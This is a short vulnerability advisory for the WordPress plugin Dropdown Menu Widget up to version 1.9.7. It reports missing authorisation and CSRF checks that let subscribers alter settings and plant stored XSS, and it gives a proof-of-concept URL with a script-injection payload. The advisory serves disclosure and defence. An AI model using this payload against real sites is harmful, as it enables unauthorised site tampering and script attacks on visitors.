## WordPress Plugin Vulnerabilities

# Dropdown Menu Widget <= 1.9.7 - Subscriber+ Arbitrary Settings Update to Stored XSS

### Description

The plugin does not have authorisation and CSRF checks when saving its settings, allowing low privilege users such as subscriber to update them. Due to the lack of sanitisation and escaping, it could also lead to Stored Cross-Site Scripting issues

### Proof of Concept

Open the following URL as a subscriber: https://example.com/wp-admin/admin.php?shailan\_dm\_active\_theme=\*url\*&shailan\_dm\_theme\_url="><script>alert(/XSS/);</script>&action=save&page=dropdown-menu
You'll get a permission denied message. Ignore it and browse to https://example.com or the plugin's settings to trigger the XSS

### Affects Plugins
